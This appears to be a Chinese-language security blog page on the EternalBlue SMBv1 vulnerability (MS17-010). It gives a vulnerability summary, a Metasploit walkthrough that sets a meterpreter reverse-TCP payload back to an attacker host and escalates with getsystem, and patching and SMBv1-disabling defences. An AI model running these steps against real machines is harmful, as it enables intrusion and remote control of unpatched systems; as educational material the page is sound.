<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>永恒之蓝漏洞分析</title>
    <style>
        /* 全局样式 */
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #0f0;
            font-family: 'Consolas', monospace;
            overflow-x: hidden;
            position: relative;
        }

        /* 矩阵背景 */
        #matrix {
            position: fixed;
            top: 0;
            left: 0;
            z-index: 0;
        }

        /* 修改后的导航栏样式 */
        nav {
            position: relative; /* 改为相对定位 */
            background: rgba(0, 20, 0, 0.95);
            padding: 1rem;
            border-bottom: 1px solid #0f0;
            transition: transform 0.3s ease; /* 添加过渡动画 */
        }

        /* 去除导航栏发光效果 */
        nav a {
            color: #0f0;
            text-decoration: none;
            margin: 0 1.5rem;
            font-family: 'Consolas', monospace; /* 恢复原始字体 */
        }

        /* 内容容器 */
        .container {
            position: relative;
            z-index: 1;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.85);
            border: 1px solid #0f03;
            min-height: 100vh;
        }

        /* 其他原有样式保持不变... */
    </style>
</head>
    
<body>
    <!-- 矩阵背景画布 -->
    <canvas id="matrix"></canvas>
    
    
    <!-- 主要内容容器... -->

    <script>
        // 添加导航栏跟随滚动效果
        let lastScroll = 0;
        const nav = document.getElementById('mainNav');
        const navHeight = nav.offsetHeight;

        window.addEventListener('scroll', () => {
            const currentScroll = window.pageYOffset;
            
            if (currentScroll > lastScroll && currentScroll > navHeight) {
                // 向下滚动时隐藏导航栏
                nav.style.transform = `translateY(-${navHeight}px)`;
            } else {
                // 向上滚动时显示导航栏
                nav.style.transform = 'translateY(0)';
            }
            lastScroll = currentScroll;
        });

        // 保持原有矩阵效果代码...
        
        // 矩阵数字雨效果
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        // 初始化画布
        function initCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            ctx.fillStyle = '#0F0';
            ctx.font = '14px monospace';
        }
        
        // 字符集和参数
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?';
        const drops = [];
        const fontSize = 14;
        let columns;

        // 初始化矩阵列
        function initDrops() {
            columns = Math.floor(canvas.width / fontSize);
            drops.length = 0;
            for (let i = 0; i < columns; i++) {
                drops[i] = Math.random() * -canvas.height;
            }
        }

        // 绘制动画帧
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            drops.forEach((yPos, index) => {
                const text = chars[Math.floor(Math.random() * chars.length)];
                const x = index * fontSize;
                ctx.fillText(text, x, yPos);
                
                if (yPos > canvas.height && Math.random() > 0.975) {
                    drops[index] = 0;
                }
                drops[index] += fontSize;
            });
        }

        // 窗口调整事件
        let resizeTimer;
        window.addEventListener('resize', () => {
            clearTimeout(resizeTimer);
            resizeTimer = setTimeout(() => {
                initCanvas();
                initDrops();
            }, 200);
        });

        // 启动动画
        initCanvas();
        initDrops();
        setInterval(drawMatrix, 50);
    </script>

    <canvas id="matrix"></canvas>
    <!-- 导航栏 -->
    <nav>
        <a href="/index.html" class="glow">首页</a>
        <a href="#" class="glow">永恒之蓝20170146</a>
    </nav>
    
    <div class="container">
        <div class="post-list">
            <h2>CVE-2017-0146 MS17-010</h2>
            <div class="post-item"> 
                <div class="post-item-content">
                    <h3 class="glow">■ 漏洞详情</h3>
                    <p><strong>漏洞名称：</strong>永恒之蓝—CVE-2017-0146 MS17-010</p>
                    <p><strong>威胁等级：</strong>高危（CVSS 8.1）</p>
                    <p><strong>影响版本：</strong></p>
                    <ul>
                        <li>Windows 7</li>
                        <li>Windows Server 2008 R2</li>
                        <li>Windows Server 2012</li>
                        <li>未打补丁的Windows 10/8.1</li>
                    </ul>

                    <h3 class="glow">■ 技术原理</h3>
                    <p>攻击者通过发送精心构造的SMBv1协议请求到目标系统的445端口：</p>
                    <ul>
                        <li>利用SrvOs2FeaListSizeToNt函数中的缓冲区溢出</li>
                        <li>通过畸形FEA（文件扩展属性）结构覆盖内核内存</li>
                        <li>劫持控制流实现任意代码执行</li>
                        <li>NSA开发的ETERNALBLUE攻击模块实现内核态Shellcode注入</li>
                    </ul>

                    <h3 class="glow">■ 如何利用此漏洞？（Metasploit示例）</h3>
                    <p>执行以下步骤：</p>
                    <ol>
                        <li>启动Metasploit框架
                            <pre>msfconsole</pre>
                        </li>
                        <li>加载攻击模块
                            <pre>use exploit/windows/smb/ms17_010_eternalblue</pre>
                        </li>
                        <li>配置参数
                            <pre>
set RHOSTS 114.514.191.9810   # 目标IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 191.981.0.1    # 攻击机IP</pre>
                        </li>
                        <li>执行攻击
                            <pre>exploit -j</pre>
                        </li>
                        <li>成功后会返回Meterpreter会话：
                            <pre>meterpreter > getsystem</pre>
                        </li>
                    </ol>

                    <h3 class="glow">■ 防御措施</h3>
                    <ul>
                        <li>立即安装MS17-010安全更新</li>
                        <li>禁用SMBv1协议（PowerShell执行）：
                            <pre>Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol</pre>
                        </li>
                        <li>配置防火墙阻止445端口入站连接</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
